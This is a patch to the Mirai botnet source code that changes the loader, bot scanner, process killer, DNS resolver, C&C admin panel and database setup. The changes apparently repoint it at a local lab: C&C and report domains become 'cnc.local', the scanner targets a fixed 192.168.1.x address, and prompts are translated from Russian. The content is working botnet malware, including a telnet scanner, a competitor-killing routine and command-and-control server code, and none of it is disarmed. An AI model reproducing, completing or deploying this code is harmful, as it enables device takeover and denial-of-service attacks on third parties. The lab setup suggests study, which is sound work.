@@ -1,0 +1,287 @@
+diff --git a/loader/src/server.c b/loader/src/server.c
+index 0a44967..60e61dd 100755
+--- a/loader/src/server.c
++++ b/loader/src/server.c
+@@ -335,7 +335,7 @@ static void handle_event(struct server_worker *wrker, struct epoll_event *ev)
+                     case TELNET_PARSE_PS:
+                         if ((consumed = connection_consume_psoutput(conn)) > 0)
+                         {
+-                            util_sockprintf(conn->fd, "/bin/busybox cat /proc/mounts; " TOKEN_QUERY "\r\n");
++                            util_sockprintf(conn->fd, "/bin/busybox cat /proc/mounts | /bin/busybox grep '/dev/'; " TOKEN_QUERY "\r\n");
+                             conn->state_telnet = TELNET_PARSE_MOUNTS;
+                         }
+                         break;
+@@ -467,7 +467,7 @@ static void handle_event(struct server_worker *wrker, struct epoll_event *ev)
+                             }
+                         }
+                         break;
+-                    case TELNET_UPLOAD_ECHO:   
++                    case TELNET_UPLOAD_ECHO:
+                         consumed = connection_upload_echo(conn);
+                         if (consumed)
+                         {
+diff --git a/mirai/bot/killer.c b/mirai/bot/killer.c
+index db1860c..1b8428b 100755
+--- a/mirai/bot/killer.c
++++ b/mirai/bot/killer.c
+@@ -170,6 +170,7 @@ void killer_init(void)
+ 
+             table_unlock_val(TABLE_KILLER_PROC);
+             table_unlock_val(TABLE_KILLER_EXE);
++            table_unlock_val(TABLE_KILLER_STATUS);
+ 
+             // Store /proc/$pid/exe into exe_path
+             ptr_exe_path += util_strcpy(ptr_exe_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));
+@@ -183,6 +184,7 @@ void killer_init(void)
+ 
+             table_lock_val(TABLE_KILLER_PROC);
+             table_lock_val(TABLE_KILLER_EXE);
++            table_lock_val(TABLE_KILLER_STATUS);
+ 
+             // Resolve exe_path (/proc/$pid/exe) -> realpath
+             if ((rp_len = readlink(exe_path, realpath, sizeof (realpath) - 1)) != -1)
+@@ -218,7 +220,7 @@ void killer_init(void)
+                 printf("[killer] Memory scan match for binary %s\n", exe_path);
+ #endif
+                 kill(pid, 9);
+-            } 
++            }
+ 
+             /*
+             if (upx_scan_match(exe_path, status_path))
+diff --git a/mirai/bot/main.c b/mirai/bot/main.c
+index 8c0510f..3a27568 100755
+--- a/mirai/bot/main.c
++++ b/mirai/bot/main.c
+@@ -155,11 +155,11 @@ int main(int argc, char **args)
+ 
+     attack_init();
+     killer_init();
+-#ifndef DEBUG
++// #ifndef DEBUG
+ #ifdef MIRAI_TELNET
+     scanner_init();
+ #endif
+-#endif
++// #endif
+ 
+     while (TRUE)
+     {
+diff --git a/mirai/bot/resolv.c b/mirai/bot/resolv.c
+index ea1f62d..209cfd6 100755
+--- a/mirai/bot/resolv.c
++++ b/mirai/bot/resolv.c
+@@ -81,7 +81,7 @@ struct resolv_entries *resolv_lookup(char *domain)
+ 
+     util_zero(&addr, sizeof (struct sockaddr_in));
+     addr.sin_family = AF_INET;
+-    addr.sin_addr.s_addr = INET_ADDR(8,8,8,8);
++    addr.sin_addr.s_addr = INET_ADDR(192,168,1,55);
+     addr.sin_port = htons(53);
+ 
+     // Set up the dns query
+diff --git a/mirai/bot/scanner.c b/mirai/bot/scanner.c
+index 615aa93..d5170db 100755
+--- a/mirai/bot/scanner.c
++++ b/mirai/bot/scanner.c
+@@ -677,33 +677,34 @@ static void setup_connection(struct scanner_connection *conn)
+ static ipv4_t get_random_ip(void)
+ {
+     uint32_t tmp;
+-    uint8_t o1, o2, o3, o4;
++    // uint8_t o1, o2, o3, o4;
++    uint8_t o3, o4;
+ 
+-    do
+-    {
++    // do
++    // {
+         tmp = rand_next();
+ 
+-        o1 = tmp & 0xff;
+-        o2 = (tmp >> 8) & 0xff;
++        // o1 = tmp & 0xff;
++        // o2 = (tmp >> 8) & 0xff;
+         o3 = (tmp >> 16) & 0xff;
+         o4 = (tmp >> 24) & 0xff;
+-    }
+-    while (o1 == 127 ||                             // 127.0.0.0/8      - Loopback
+-          (o1 == 0) ||                              // 0.0.0.0/8        - Invalid address space
+-          (o1 == 3) ||                              // 3.0.0.0/8        - General Electric Company
+-          (o1 == 15 || o1 == 16) ||                 // 15.0.0.0/7       - Hewlett-Packard Company
+-          (o1 == 56) ||                             // 56.0.0.0/8       - US Postal Service
+-          (o1 == 10) ||                             // 10.0.0.0/8       - Internal network
+-          (o1 == 192 && o2 == 168) ||               // 192.168.0.0/16   - Internal network
+-          (o1 == 172 && o2 >= 16 && o2 < 32) ||     // 172.16.0.0/14    - Internal network
+-          (o1 == 100 && o2 >= 64 && o2 < 127) ||    // 100.64.0.0/10    - IANA NAT reserved
+-          (o1 == 169 && o2 > 254) ||                // 169.254.0.0/16   - IANA NAT reserved
+-          (o1 == 198 && o2 >= 18 && o2 < 20) ||     // 198.18.0.0/15    - IANA Special use
+-          (o1 >= 224) ||                            // 224.*.*.*+       - Multicast
+-          (o1 == 6 || o1 == 7 || o1 == 11 || o1 == 21 || o1 == 22 || o1 == 26 || o1 == 28 || o1 == 29 || o1 == 30 || o1 == 33 || o1 == 55 || o1 == 214 || o1 == 215) // Department of Defense
+-    );
+-
+-    return INET_ADDR(o1,o2,o3,o4);
++    // }
++    // while (o1 == 127 ||                             // 127.0.0.0/8      - Loopback
++    //       (o1 == 0) ||                              // 0.0.0.0/8        - Invalid address space
++    //       (o1 == 3) ||                              // 3.0.0.0/8        - General Electric Company
++    //       (o1 == 15 || o1 == 16) ||                 // 15.0.0.0/7       - Hewlett-Packard Company
++    //       (o1 == 56) ||                             // 56.0.0.0/8       - US Postal Service
++    //       (o1 == 10) ||                             // 10.0.0.0/8       - Internal network
++    //       (o1 == 192 && o2 == 168) ||               // 192.168.0.0/16   - Internal network
++    //       (o1 == 172 && o2 >= 16 && o2 < 32) ||     // 172.16.0.0/14    - Internal network
++    //       (o1 == 100 && o2 >= 64 && o2 < 127) ||    // 100.64.0.0/10    - IANA NAT reserved
++    //       (o1 == 169 && o2 > 254) ||                // 169.254.0.0/16   - IANA NAT reserved
++    //       (o1 == 198 && o2 >= 18 && o2 < 20) ||     // 198.18.0.0/15    - IANA Special use
++    //       (o1 >= 224) ||                            // 224.*.*.*+       - Multicast
++    //       (o1 == 6 || o1 == 7 || o1 == 11 || o1 == 21 || o1 == 22 || o1 == 26 || o1 == 28 || o1 == 29 || o1 == 30 || o1 == 33 || o1 == 55 || o1 == 214 || o1 == 215) // Department of Defense
++    // );
++
++    return INET_ADDR(192,168,1,113);
+ }
+ 
+ static int consume_iacs(struct scanner_connection *conn)
+diff --git a/mirai/bot/table.c b/mirai/bot/table.c
+index 13b341e..2429384 100755
+--- a/mirai/bot/table.c
++++ b/mirai/bot/table.c
+@@ -15,10 +15,10 @@ struct table_value table[TABLE_MAX_KEYS];
+ 
+ void table_init(void)
+ {
+-    add_entry(TABLE_CNC_DOMAIN, "\x41\x4C\x41\x0C\x41\x4A\x43\x4C\x45\x47\x4F\x47\x0C\x41\x4D\x4F\x22", 30); // cnc.changeme.com
++    add_entry(TABLE_CNC_DOMAIN, "\x41\x4C\x41\x0C\x4E\x4D\x41\x43\x4E\x22", 10); // cnc.local
+     add_entry(TABLE_CNC_PORT, "\x22\x35", 2);   // 23
+ 
+-    add_entry(TABLE_SCAN_CB_DOMAIN, "\x50\x47\x52\x4D\x50\x56\x0C\x41\x4A\x43\x4C\x45\x47\x4F\x47\x0C\x41\x4D\x4F\x22", 29); // report.changeme.com
++    add_entry(TABLE_SCAN_CB_DOMAIN, "\x41\x4C\x41\x0C\x4E\x4D\x41\x43\x4E\x22", 10); // cnc.local
+     add_entry(TABLE_SCAN_CB_PORT, "\x99\xC7", 2);         // 48101
+ 
+     add_entry(TABLE_EXEC_SUCCESS, "\x4E\x4B\x51\x56\x47\x4C\x4B\x4C\x45\x02\x56\x57\x4C\x12\x22", 15);
+diff --git a/mirai/cnc/admin.go b/mirai/cnc/admin.go
+index 28a2091..c77fd56 100755
+--- a/mirai/cnc/admin.go
++++ b/mirai/cnc/admin.go
+@@ -5,7 +5,7 @@ import (
+     "net"
+     "time"
+     "strings"
+-    "io/ioutil"
++    // "io/ioutil"
+     "strconv"
+ )
+ 
+@@ -25,17 +25,17 @@ func (this *Admin) Handle() {
+         this.conn.Write([]byte("\033[?1049l"))
+     }()
+ 
+-    headerb, err := ioutil.ReadFile("prompt.txt")
+-    if err != nil {
+-        return
+-    }
++    // headerb, err := ioutil.ReadFile("prompt.txt")
++    // if err != nil {
++    //     return
++    // }
+ 
+-    header := string(headerb)
+-    this.conn.Write([]byte(strings.Replace(strings.Replace(header, "\r\n", "\n", -1), "\n", "\r\n", -1)))
++    // header := string(headerb)
++    // this.conn.Write([]byte(strings.Replace(strings.Replace(header, "\r\n", "\n", -1), "\n", "\r\n", -1)))
+ 
+     // Get username
+     this.conn.SetDeadline(time.Now().Add(60 * time.Second))
+-    this.conn.Write([]byte("\033[34;1mпользователь\033[33;3m: \033[0m"))
++    this.conn.Write([]byte("\033[34;1mUsername\033[33;3m: \033[0m"))
+     username, err := this.ReadLine(false)
+     if err != nil {
+         return
+@@ -43,7 +43,7 @@ func (this *Admin) Handle() {
+ 
+     // Get password
+     this.conn.SetDeadline(time.Now().Add(60 * time.Second))
+-    this.conn.Write([]byte("\033[34;1mпароль\033[33;3m: \033[0m"))
++    this.conn.Write([]byte("\033[34;1mPassword\033[33;3m: \033[0m"))
+     password, err := this.ReadLine(true)
+     if err != nil {
+         return
+@@ -53,15 +53,15 @@ func (this *Admin) Handle() {
+     this.conn.Write([]byte("\r\n"))
+     spinBuf := []byte{'-', '\\', '|', '/'}
+     for i := 0; i < 15; i++ {
+-        this.conn.Write(append([]byte("\r\033[37;1mпроверив счета... \033[31m"), spinBuf[i % len(spinBuf)]))
++        this.conn.Write(append([]byte("\r\033[37;1mLogging in... \033[31m"), spinBuf[i % len(spinBuf)]))
+         time.Sleep(time.Duration(300) * time.Millisecond)
+     }
+ 
+     var loggedIn bool
+     var userInfo AccountInfo
+     if loggedIn, userInfo = database.TryLogin(username, password); !loggedIn {
+-        this.conn.Write([]byte("\r\033[32;1mпроизошла неизвестная ошибка\r\n"))
+-        this.conn.Write([]byte("\033[31mнажмите любую клавишу для выхода. (any key)\033[0m"))
++        this.conn.Write([]byte("\r\033[32;1mAn unknown error occurred\r\n"))
++        this.conn.Write([]byte("\033[31mPress any key to exit. (any key)\033[0m"))
+         buf := make([]byte, 1)
+         this.conn.Read(buf)
+         return
+diff --git a/mirai/cnc/main.go b/mirai/cnc/main.go
+index 670b7a7..f45d62d 100755
+--- a/mirai/cnc/main.go
++++ b/mirai/cnc/main.go
+@@ -8,7 +8,7 @@ import (
+ )
+ 
+ const DatabaseAddr string   = "127.0.0.1"
+-const DatabaseUser string   = "root"
++const DatabaseUser string   = "mirai"
+ const DatabasePass string   = "password"
+ const DatabaseTable string  = "mirai"
+ 
+@@ -16,13 +16,13 @@ var clientList *ClientList = NewClientList()
+ var database *Database = NewDatabase(DatabaseAddr, DatabaseUser, DatabasePass, DatabaseTable)
+ 
+ func main() {
+-    tel, err := net.Listen("tcp", "0.0.0.0:23")
++    tel, err := net.Listen("tcp4", "0.0.0.0:23")
+     if err != nil {
+         fmt.Println(err)
+         return
+     }
+ 
+-    api, err := net.Listen("tcp", "0.0.0.0:101")
++    api, err := net.Listen("tcp4", "0.0.0.0:101")
+     if err != nil {
+         fmt.Println(err)
+         return
+diff --git a/mirai/tools/scanListen.go b/mirai/tools/scanListen.go
+index 948fc6b..fa67496 100755
+--- a/mirai/tools/scanListen.go
++++ b/mirai/tools/scanListen.go
+@@ -9,7 +9,7 @@ import (
+ )
+ 
+ func main() {
+-    l, err := net.Listen("tcp", "0.0.0.0:48101")
++    l, err := net.Listen("tcp4", "0.0.0.0:48101")
+     if err != nil {
+         fmt.Println(err)
+         return
+diff --git a/scripts/db.sql b/scripts/db.sql
+index 6d873dc..4f90c3e 100644
+--- a/scripts/db.sql
++++ b/scripts/db.sql
+@@ -1,4 +1,6 @@
++DROP DATABASE IF EXISTS mirai;
+ CREATE DATABASE mirai;
++USE mirai;
+ 
+ CREATE TABLE `history` (
+   `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
+@@ -34,3 +36,6 @@ CREATE TABLE `whitelist` (
+   PRIMARY KEY (`id`),
+   KEY `prefix` (`prefix`)
+ );
++
++GRANT ALL PRIVILEGES ON mirai.* To 'mirai'@'localhost' IDENTIFIED BY 'password';
++INSERT INTO users VALUES (NULL, 'mirai', 'password', 0, 0, 0, 0, -1, 1, 30, '');
+\ No newline at end of file
